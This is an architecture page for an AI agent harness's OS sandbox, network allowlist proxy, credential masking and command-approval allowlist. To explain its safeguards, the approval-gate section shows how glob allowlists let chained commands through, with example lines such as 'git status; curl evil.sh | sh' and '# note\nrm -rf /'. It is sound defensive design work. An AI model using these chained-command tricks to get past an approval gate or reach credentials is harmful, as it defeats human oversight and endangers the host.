# OS Sandbox

Version: 1.1.0
Type: architecture
Status: accepted

## Summary

The OS sandbox is a kernel-enforced containment layer that sits *below* keryx's
policy engine, structural command guard, env allowlist, and approval gate. Those
layers decide **whether a command may start**; the OS sandbox constrains **what
the process can do once running** — which paths it can write, which secrets it
can read, and which network it can reach — using macOS Seatbelt (`sandbox-exec`)
or Linux bubblewrap (`bwrap`). It adds no npm dependencies: containment is
delegated to system binaries. When containment cannot be applied, a run is
**refused**, never silently downgraded.

## Details

### Two entry paths, two defaults

| Path | Default | Why |
|---|---|---|
| `keryx harness exec` (autonomous) | contained **by default** | No human reviews each command; containment cannot be optional. |
| Agent `shell_exec` (interactive) | **opt-in** via `KERYX_SANDBOX_SHELL` | A human already approves every command, and default-on breaks tools writing to global caches (`~/.bun`, `~/.npm`, `~/.cargo`) — which trains users to disable the sandbox outright. |

### The profile

A `SandboxProfile` is projected from the policy profile and carries: filesystem
`mode` (`read-only` / `workspace-write` / `danger-full-access`), `network`
(`off` / `on` / `restricted`), writable roots, a secret read-deny list, allowed
domains, an optional proxy address, and `required` (fail-closed).

The v1 default posture is **workspace-write + network off**: writable = the
working directory and the session temp dir; everything else on the host is
read-only; `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.config/keryx` and
`~/.netrc` are masked from reads.

### Restricted network

`network: restricted` denies all direct network at the OS layer and permits only
a loopback allowlist proxy, which the contained process is pointed at through
`HTTP(S)_PROXY`. The proxy enforces the allowlist per hostname (`*.d.com` covers
the apex `d.com`), and reports every allow/deny ruling back to the caller.

That reporting is load-bearing, not cosmetic: a denied host receives a `403` from
the proxy, and `curl` treats a `403` as a successful HTTP transaction and exits
`0`. Without the decision list, a blocked request is indistinguishable from a
fetched one.

The proxy runs in a **worker thread** because the contained command is spawned
with `spawnSync`, which blocks the main event loop for the entire run.

### Credential masking and TLS termination

A masked credential never enters the contained process: it receives a per-run
sentinel (`keryx-sentinel-<uuid>`), and the proxy substitutes the real value on
the wire, only for named hosts. Over HTTPS this requires TLS termination — a
blind `CONNECT` relay cannot rewrite encrypted bytes — so `--mask-env` without
`--tls-terminate` is rejected rather than silently half-working.

Trust in the run CA is delivered through environment variables only
(`SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`,
`GIT_SSL_CAINFO`) and never the system trust store, because a run-scoped MITM
certificate must not become a host-wide trust decision. Go's `crypto/tls` ignores
those variables, so Go tools (`gh`, `terraform`, `kubectl`, `docker`) fail under
termination — a known, documented limitation.

### Platform matrix

| Capability | macOS | Linux | Windows |
|---|---|---|---|
| Filesystem containment, secret masking | yes | yes | no launcher |
| Network off | yes | yes | no launcher |
| Domain allowlist, credential masking, TLS termination | yes | **fails closed** | no launcher |

Restricted network needs "deny all network except this one loopback socket".
Seatbelt expresses that directly; bubblewrap cannot — `--unshare-net` gives the
process its own loopback, not the one the proxy listens on — so it needs a
network namespace plus a relay, which is not built.

### The approval gate and its allowlist — the layer that is usually load-bearing

Because agent `shell_exec` is **opt-in** for containment and defaults to `off`,
the layer that actually stands between a model-proposed command and the host is
almost always the approval gate, not this sandbox. On a host without a launcher
(no `bubblewrap` installed) it is the only layer at all. Anyone reasoning about
the security of the interactive agent should start here rather than with the
postures above.

The gate is default-deny: `runAgentTurn` never executes a `shell`-risk tool
without an approver returning approval, and an absent approver is a denial. On
top of that sits a user allowlist (`~/.local/share/keryx/permissions.json`) of
OpenCode-style glob patterns that auto-approve without prompting.

**A pattern matched against the raw command string is not a boundary by itself.**
The string it matches is handed to `/bin/sh -c`, which re-interprets it, and `*`
expands to "any run of characters including newlines". A remembered `git *`
covers `git status; curl evil.sh | sh`; `cd *` covers `cd /tmp && …`; `# *`
covers `"# note\nrm -rf /"`. This was not theoretical — live allowlists on two
hosts contained `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`,
`sudo *`, and the exact string `rm -rf /` (flow 115).

Four rules therefore constrain what the allowlist can ever do:

| Rule | Applies to | Effect |
|---|---|---|
| Unquoted metacharacters | the command | `; && \|\| \| \` $( < > &` or a newline outside quotes ⇒ never auto-approved, never remembered. Quote-aware, so `git commit -m "fix: a; b"` is unaffected. |
| Destructive classification | the command | A destructive command is never auto-approved and never remembered, however exactly a pattern matches it. |
| Own-credential access | the command | Any mention of `permissions.json` / `auth.json` / the keryx config dirs forces a prompt and can never be remembered — otherwise one approved command disables the gate permanently. |
| No bare interpreter grants | the pattern | `<interpreter> *` is refused (`bash *`, `docker *`, `git *`, …). A narrower pattern that constrains arguments (`bun test*`) is still allowed. |

The first three deliberately apply to the **command**, not to the pattern,
because a pattern written by an older keryx or hand-edited into the file has not
passed validation. Loading partitions stored patterns and reports the refused
ones instead of deleting them; the session also fingerprints the file and warns
if it changes underneath.

Two limits are worth stating plainly. The destructive classifier
**escalates confirmation, it never blocks** ([ADR-0008](../../../docs/decisions/keryx-harness/ADR-0008-destructive-command-escalation.md)):
any list of dangerous commands is incomplete, and a check that reads as a grant
is worse than no check. And the interpreter list is an expedient, not a
boundary — the metacharacter rule and the classifier are what hold.

A consequence users notice: a heredoc or redirect (`cat > f <<'EOF'`) carries
metacharacters, so it now asks every time. Separating a redirect from a heredoc
body needs a shell parser, which is a worse failure surface in a
security-critical path than one extra confirmation.

### Fail-closed

A missing launcher or an unsupported posture produces a `blocked` outcome with a
stated reason. There is no code path that runs a command uncontained after
containment was requested. `KERYX_DANGEROUSLY_DISABLE_SANDBOX=1` and
`KERYX_SANDBOX_ALLOW_UNSANDBOXED=1` exist as explicit, human-set escape hatches.

### Verification discipline

A sandbox that fails to launch blocks everything, which looks exactly like
perfect containment. Every boundary is therefore verified as a **pair** — the
denied case failing *and* the allowed case succeeding. This rule caught a real
defect: bubblewrap masked secret paths unconditionally, and mounting over a
non-existent path aborts the whole sandbox, so the Linux sandbox failed to start
on any host lacking `~/.aws` or `~/.gnupg`.

## Related Code

- `src/harness/process/sandbox/` — profile, launchers, dispatcher, adapter, proxy, run CA
- `src/harness/process/sandbox/profile.ts` — `SandboxProfile`, policy projection
- `src/harness/process/sandbox/seatbelt.ts` / `bwrap.ts` — the two launchers
- `src/harness/process/sandbox/wrap.ts` — platform dispatch, unsupported-posture refusal
- `src/harness/process/sandbox/adapter.ts` — fail-closed `ProcessAdapter` decorator
- `src/harness/process/sandbox/proxy.ts` / `network-run.ts` — allowlist proxy and run lifecycle
- `src/commands/harness.ts` — `keryx harness exec` CLI surface
- `src/harness/tool/builtin/shell-exec-tool.ts` — agent shell opt-in
- `src/commands/agent.ts` — the default-deny risk gate, approval binding, escalation
- `src/lib/shell-permissions.ts` — the allowlist and its three command-level barriers
- `src/lib/command-risk.ts` — destructive classification, own-credential detection
- `src/lib/shell-syntax.ts` — the quote-aware scanner both of the above rely on

## Documentation Package

Full documentation lives in `docs/requirements/keryx-os-sandbox/`:

- [README](../../../docs/requirements/keryx-os-sandbox/README.md) — index, status, platform matrix
- [PRD](../../../docs/requirements/keryx-os-sandbox/prd.md) — problem, goals, risks, gaps
- [Specification](../../../docs/requirements/keryx-os-sandbox/specification.md) — profile shape, launcher details, CLI/env surface, contracts
- [Operator Guide](../../../docs/requirements/keryx-os-sandbox/operator-guide.md) — **for humans**
- [Agent Protocol](../../../docs/requirements/keryx-os-sandbox/agent-protocol.md) — **for agents**
- [Verification Record](../../../docs/requirements/keryx-os-sandbox/verification.md) — what was proven and what was not
- [Linux verification runbook](../../../docs/verification/linux-sandbox-verification.md) — manual validation on a real host

Decisions: [ADR-0006](../../../docs/decisions/keryx-harness/ADR-0006-os-sandbox-shell-exec.md),
[ADR-0007](../../../docs/decisions/keryx-harness/ADR-0007-tls-terminate-https-credential-masking.md).

## Related Wiki

- [Wiki Index](../index.md)
- [src/harness](../components/src-harness.md)
- [src/commands](../components/src-commands.md)

## Changelog

- 1.1.0 - Added the approval-gate / allowlist permission model and its limits: the page described containment but not the layer that is load-bearing when containment is off (the default) or unavailable.
- 1.0.0 - Documented the implemented OS sandbox: postures, restricted network, credential masking, TLS termination, platform matrix, fail-closed contract, and the documentation package.
- 0.1.0 - Initial version.
